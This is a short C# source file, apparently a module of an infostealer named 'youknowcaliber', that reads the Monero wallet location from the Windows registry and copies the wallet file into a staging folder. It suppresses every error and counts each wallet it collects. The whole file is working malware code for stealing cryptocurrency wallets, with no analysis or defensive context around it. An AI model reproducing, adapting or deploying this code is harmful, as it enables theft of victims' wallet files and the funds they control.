﻿using System;
using System.IO;
using Microsoft.Win32;

namespace youknowcaliber
{
	internal class Monero
	{
		public static void XMRcoinStr(string directorypath)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core");
				Directory.CreateDirectory(directorypath + Monero.base64xmr);
				string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
				Directory.CreateDirectory(directorypath + Monero.base64xmr);
				File.Copy(text, directorypath + Monero.base64xmr + text.Split(new char[]
				{
					'\\'
				})[text.Split(new char[]
				{
					'\\'
				}).Length - 1]);
				Monero.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		public static int count = 0;

		public static string base64xmr = "\\Wallets\\Monero\\";
	}
}
